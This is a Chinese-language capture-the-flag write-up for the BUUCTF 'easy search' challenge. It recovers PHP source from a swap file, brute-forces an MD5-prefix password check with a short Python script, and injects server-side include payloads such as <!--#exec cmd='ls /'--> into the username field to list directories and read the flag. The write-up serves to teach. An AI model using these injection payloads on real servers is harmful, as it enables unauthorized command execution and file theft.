# T24 easy search

> 题目：BUUCTF easy search

__0x00 审题__

打开是一个登陆页面，username与password,经过尝试注入，发现没有用，怎么办，扫目录

得到index.php.swp

打开文件得到源码：

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```


找重点：

```php
if ( $admin == substr(md5($_POST['password']),0,6)) {
```

__0x01  解题__

1. 写脚本得到符合条件的password

```python
import hashlib
for i in range(10000000):
    a=hashlib.md5(str(i).encode('utf-8')).hexdigest()
    if(a[0:6]=='6d0bc1'):
        print(str(i))
```

得到password：

```
2020666
2305004
9162671
```

输入密码，得到welcome，发现代码还得到了一个shtml，直接登录发现没有，抓包查看

得到

```
Url_is_here: public/6244f4805659902e2aa37d22ec592c5623402643.shtml
```

2. 访问页面，得到

```
Hello,admin

data: Saturday, 11-Feb-2023 07:54:49 UTC
```
> 啊，这是啥

仔细一看是登录信息

> 这里用到shtml，HTML是静态的，而shtml基于SSI技术，当有服务器端可执行脚本时被当作一种动态编程语言，所以可以注入，也可以用来远程命令执行。[详情](https://blog.csdn.net/pakho_C/article/details/126049432)

输入格式：<!--#exec cmd="命令"-->

我们可以在username中构造payload查询根目录：

```
<!--#exec cmd="ls /"--> 查根目录
<!--#exec cmd="ls"--> 查当前目录
<!--#exec cmd="ls ../"--> 查上级目录
```
3. 得到flag文件名称，可得到该文件

方法：<!--#exec cmd="cat ../flag名"-->









